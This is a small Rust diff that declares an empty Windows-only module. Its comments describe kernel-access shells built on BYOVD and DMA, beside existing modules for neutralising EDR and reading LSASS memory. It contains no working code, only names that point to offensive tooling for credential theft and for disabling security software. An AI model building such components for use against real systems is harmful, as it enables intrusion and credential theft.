@@ -82,6 +82,11 @@ pub mod persistence;
 /// (WFP rule templates), `KernelLsassReader` (DTB + page-walk shell),
 /// `EdrNeutralizer` (Kill/Freeze/Choke tiers). Algorithm + framework.
 pub mod netsec;
+/// Windows-specific kernel-tier shells (BYOVD/KslD/DMA `KernelRw` impls +
+/// symbol resolution). Empty for now — algorithms live in the sibling modules;
+/// this is where the Windows-only bootstrap lands.
+#[cfg(target_os = "windows")]
+pub mod win;
 
 // ---- Errors ---------------------------------------------------------------
 
